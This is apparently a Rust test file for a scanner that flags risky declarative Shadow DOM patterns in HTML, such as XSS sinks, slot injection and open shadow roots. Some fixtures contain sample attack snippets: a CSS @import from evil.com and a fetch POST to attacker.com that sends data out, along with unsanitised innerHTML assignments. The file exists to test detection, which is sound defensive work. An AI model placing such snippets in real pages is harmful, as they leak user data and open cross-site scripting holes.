use crate::declarative_shadow_dom_audit::*;

#[test]
fn test_no_api_no_issues() {
    let body = "<html><body><p>No shadow DOM here</p></body></html>";
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.is_empty());
}

#[test]
fn test_api_detected_shadowrootmode() {
    let body = r#"<template shadowrootmode="closed"><p>Shadow content</p></template>"#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::ApiDetected));
}

#[test]
fn test_api_detected_shadowroot() {
    let body = r#"<div shadowroot><p>Content</p></div>"#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::ApiDetected));
}

#[test]
fn test_xss_via_template_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <script>element.innerHTML = userInput;</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::XssViaTemplate));
}

#[test]
fn test_xss_via_template_with_sanitize_not_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <script>element.innerHTML = DOMPurify.sanitize(userInput);</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(!issues.contains(&DeclarativeShadowDomIssue::XssViaTemplate));
}

#[test]
fn test_style_exfiltration_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <style>@import url(evil.com/steal);</style>
            <script>fetch('https://attacker.com', {method: 'POST'});</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::StyleExfiltration));
}

#[test]
fn test_style_without_exfil_not_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <style>div { color: red; }</style>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(!issues.contains(&DeclarativeShadowDomIssue::StyleExfiltration));
}

#[test]
fn test_slot_injection_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <slot name="content"></slot>
            <script>slotElement.innerHTML = data;</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::SlotInjection));
}

#[test]
fn test_slot_injection_with_encode_not_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <slot name="content"></slot>
            <script>slotElement.innerHTML = encode(data);</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(!issues.contains(&DeclarativeShadowDomIssue::SlotInjection));
}

#[test]
fn test_open_mode_risk_detected_quoted() {
    let body = r#"<template shadowrootmode="open"><p>Content</p></template>"#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::OpenModeRisk));
}

#[test]
fn test_open_mode_risk_detected_unquoted() {
    let body = r#"<template shadowrootmode=open><p>Content</p></template>"#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::OpenModeRisk));
}

#[test]
fn test_closed_mode_no_open_risk() {
    let body = r#"<template shadowrootmode="closed"><p>Content</p></template>"#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(!issues.contains(&DeclarativeShadowDomIssue::OpenModeRisk));
}

#[test]
fn test_multiple_issues_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <style>@import url(evil.com);</style>
            <slot name="user"></slot>
            <script>
                slot.innerHTML = userInput;
                fetch('https://attacker.com', {method: 'POST', body: data});
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::ApiDetected));
    assert!(issues.contains(&DeclarativeShadowDomIssue::XssViaTemplate));
    assert!(issues.contains(&DeclarativeShadowDomIssue::StyleExfiltration));
    assert!(issues.contains(&DeclarativeShadowDomIssue::SlotInjection));
    assert!(issues.contains(&DeclarativeShadowDomIssue::OpenModeRisk));
}

#[test]
fn test_severity_values() {
    assert_eq!(
        declarative_shadow_dom_severity(&DeclarativeShadowDomIssue::ApiDetected),
        2.0
    );
    assert_eq!(
        declarative_shadow_dom_severity(&DeclarativeShadowDomIssue::XssViaTemplate),
        8.0
    );
    assert_eq!(
        declarative_shadow_dom_severity(&DeclarativeShadowDomIssue::StyleExfiltration),
        7.0
    );
    assert_eq!(
        declarative_shadow_dom_severity(&DeclarativeShadowDomIssue::SlotInjection),
        6.5
    );
    assert_eq!(
        declarative_shadow_dom_severity(&DeclarativeShadowDomIssue::OpenModeRisk),
        5.5
    );
}

#[test]
fn test_operations_generation() {
    let issues = vec![
        DeclarativeShadowDomIssue::ApiDetected,
        DeclarativeShadowDomIssue::XssViaTemplate,
    ];
    let mut seq = 1;
    let ops = declarative_shadow_dom_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 3);
}

#[test]
fn test_display_formatting() {
    assert_eq!(
        DeclarativeShadowDomIssue::ApiDetected.to_string(),
        "api_detected"
    );
    assert_eq!(
        DeclarativeShadowDomIssue::XssViaTemplate.to_string(),
        "xss_via_template"
    );
    assert_eq!(
        DeclarativeShadowDomIssue::StyleExfiltration.to_string(),
        "style_exfiltration"
    );
    assert_eq!(
        DeclarativeShadowDomIssue::SlotInjection.to_string(),
        "slot_injection"
    );
    assert_eq!(
        DeclarativeShadowDomIssue::OpenModeRisk.to_string(),
        "open_mode_risk"
    );
}
